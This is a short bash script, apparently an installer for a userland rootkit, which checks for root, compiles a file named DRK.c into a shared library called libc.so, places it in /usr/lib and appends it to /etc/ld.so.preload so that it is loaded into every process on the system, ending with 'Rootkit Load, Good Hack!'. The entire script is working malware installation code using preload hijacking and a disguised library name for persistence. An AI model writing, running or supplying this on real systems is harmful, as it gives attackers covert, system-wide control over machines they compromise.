#!/usr/bin/env bash
# INSTALL ROOTKIT USERLAND

if [ $(whoami) = "root" ]; then

# Loading
echo -n "[+] Install"

for load in $(seq 1 3); do
echo -n "."
sleep 0.5;
done

# compilation
/usr/bin/gcc DRK.c -o libc.so -shared -fPIC -ldl

# moved dynamic library for /usr/bin
mv libc.so /usr/lib

#LD_PRELOAD
echo "/usr/lib/libc.so" >> /etc/ld.so.preload
ldconfig

#clear screen
clear

echo "[!] Rootkit Load, Good Hack! Open New Terminal."

else

echo "[!] Run With ROOT!"

fi
